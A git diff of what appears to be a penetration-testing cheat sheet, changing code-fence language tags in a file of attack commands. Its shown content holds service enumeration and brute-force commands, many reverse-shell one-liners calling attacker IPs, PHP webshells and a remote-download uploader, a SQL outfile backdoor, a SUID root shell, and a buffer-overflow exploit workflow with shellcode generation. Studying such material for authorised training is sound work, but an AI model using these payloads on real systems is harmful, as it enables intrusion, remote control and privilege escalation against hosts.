@@ -125,7 +125,7 @@ shoutout to @21y4d for this
 
 upgrade searchsploit 
 
-```
+```bash
 searchsploit -u
 searchsploit <service>
 
@@ -135,7 +135,7 @@ google service version exploit
 
 ### 1. HTTP  80, 8000, 8080
 
-```
+```bash
 nikto -h IP
 curl -i http(s)://IP/robots.txt
 wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://<IP>/FUZZ.txt" -t 100
@@ -168,7 +168,7 @@ hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-comm
 
 - password bruteforce
 
-```
+```php
 - <?php include $_GET['inc']; ?>
 ```
 
@@ -176,7 +176,7 @@ hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-comm
 
 ### 2. HTTPS 443
 
-```
+```bash
 sslscan https://192.168.1.10/
 ```
 - check out potential usernames in the ssl cert and the correct vhost
@@ -184,7 +184,7 @@ sslscan https://192.168.1.10/
 
 ### 3. FTP 21 TFTP UDP 69
 
-```
+```bash
 ftp IP
 anonymous:anonymous
 nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn IP
@@ -199,7 +199,7 @@ nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp
 
 ### 4. SMB 139,445
 
-```
+```bash
 enum4linux -a IP
 smbclient -L IP
 locate *.nse | grep smb
@@ -226,7 +226,7 @@ smbclient //IP/admin$ -U administrator
 
 ### 4. SNMP UDP 161
 
-```
+```bash
 snmp-check
 echo public > community
 echo private >> community
@@ -246,7 +246,7 @@ snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2
 
 ### 6. SMTP/Email 25, 110/995 or 143/993
 
-```
+```bash
 nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn IP
 
 telnet IP 110
@@ -264,7 +264,7 @@ QUIT
 
 ### 7. LDAP 389
 
-```
+```bash
 ldapsearch -x -h IP -p389 -s base namingcontexts
 nmap -p 389 --script ldap-search IP
 ```
@@ -273,7 +273,8 @@ nmap -p 389 --script ldap-search IP
 
 modify /etc/hosts file for individual dns resolution
 modify /etc/resolv.conf for nameserver resolution overall
-```
+
+```bash
 nslookup
 SERVER <ip>
 <ip>
@@ -285,14 +286,15 @@ dig axfr subdomain @IP
 ### 9. RPC 135
 
 -metasploit exploit for ms-rpc: exploit/windows/dcerpc/ms05_017_msmq
-```
+
+```bash
 nmap -n -v -sV -Pn -p 135 --script=msrpc-enum IP 
 ```
 
 
 ### 10. MySQL 3306
 
-```
+```bash
 nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 IP
 
 mysql --host=IP -u root -p
@@ -302,55 +304,55 @@ mysql --host=IP -u root -p
 
 - creating a php backdoor shell
 
-```
+```bash
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=4444 -f raw
 ```
 
 - bash 
 
-```
+```bash
 bash -i >& /dev/tcp/10.10.14.40/4444 0>&1
 ```
 
 - perl
 
-```
+```perl
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 - python
 
-```
+```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 - php
 
-```
+```php
 php -r '$sock=fsockopen("10.10.14.42",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 - php rce
 
-```
+```php
 <?php echo system($_REQUEST['zu']); ?>
 ```
 
 - php one liner
 
-```
+```php
 <?php exec("/bin/bash -c ‘bash -i >& /dev/tcp/10.10.14.40/4444 0>&1’"); ?>
 ```
 
 - php webshell one liner
 
-```
+```php
 <?php system($_REQUEST['cmd']); ?>
 ```
 
 - php webshell for windows, upload and execute
 
-```
+```php
 <?php
   if (isset($_REQUEST['fupload'])) {
     file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.42:8000/" . $_REQUEST['fupload']));
@@ -365,46 +367,48 @@ EOF;
 
 - phpadmin shell
 
-```
+```php
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
 ```
 
 - ruby
 
-```
+```ruby
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
 - netcat
 
-```
+```bash
 nc -e /bin/sh 10.0.0.1 1234
 ```
 
 - netcat for outdated systems
 
-```
+```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f
 ```
 
 - netcat for windows
 
-```
+```bash
 nc64.exe 10.10.14.42 4444 -e cmd.exe
 ```
 
 - java
 
-```
+```java
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
+```
 
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f war > zuk3y.war
 ```
 - SUID C Shell
 
-```
+```c
 int main(void){
 
 setresuid(0, 0, 0);
@@ -416,7 +420,7 @@ system("/bin/bash");
 
 - iis aspx reverse shell
 
-```
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
 ```
 
@@ -428,7 +432,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 
 - upgrade reverse shell
 
-```
+```python
 python3 -c "import pty; pty.spawn('/bin/bash')"
 ```
 - find your own term value: ```echo $TERM```
@@ -442,7 +446,7 @@ python3 -c "import pty; pty.spawn('/bin/bash')"
 
 ### linux
 
-```
+```bash
 sudo -l
 uname -ar
 find / -user root -perm -4000 -print 2>/dev/null
@@ -457,7 +461,7 @@ find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
 
 ### windows
 
-```
+```cmd
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 ```
 
@@ -467,12 +471,12 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
 running within cmd
 
-```
+```cmd
 CMD C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
 ```
 running within powershell
 
-```
+```powershell
 PS C:\temp> .\jaws-enum.ps1
 ```
 
@@ -488,7 +492,7 @@ PS C:\temp> .\jaws-enum.ps1
 
 ### fuzz.py
 
-```
+```python
 #!/usr/bin/python
 import sys, socket
 from time import sleep
@@ -514,7 +518,7 @@ while True:
 
 - /usr/share/metasploit-framework/tools/exploit/pattern-create.rb -l 5000
 
-```
+```python
 #!/usr/bin/python
 import sys, socket
 from time import sleep
@@ -538,7 +542,7 @@ except:
 ### overwrite.py
 
 
-```
+```python
 #!/usr/bin/python
 import sys, socket
 from time import sleep
@@ -562,7 +566,7 @@ except:
 ### badchars.py
 
 
-```
+```python
 #!/usr/bin/python
 import sys, socket
 from time import sleep
@@ -599,7 +603,7 @@ except:
 - view modules -> find command JMP ESP (FFE4)
 - little endian rules
 
-```
+```python
 #!/usr/bin/python
 import sys, socket
 from time import sleep
@@ -624,11 +628,10 @@ except:
 
 - generate shellcode with
 
-```
+```bash
 msfvenom -p windows/shell_reverse_tcp -lhost=yourip -lport=yourport -f c -a x86 EXITFUNC=thread -b "\x00(badchars)"
 ```
-```
-  GNU nano 4.9.3     shellcode.py                
+```python                
 #!/usr/bin/python
 import sys, socket
 from time import sleep
@@ -682,14 +685,14 @@ except:
 - compiling windows exploits
 
 
-```
+```bash
 i686-w64-mingw32-gcc exploit.c -o exploit
 ```
 
 - for 32 bit
 
 
-```
+```bash
 i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32
 ```
 - [precompiled windows-kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)
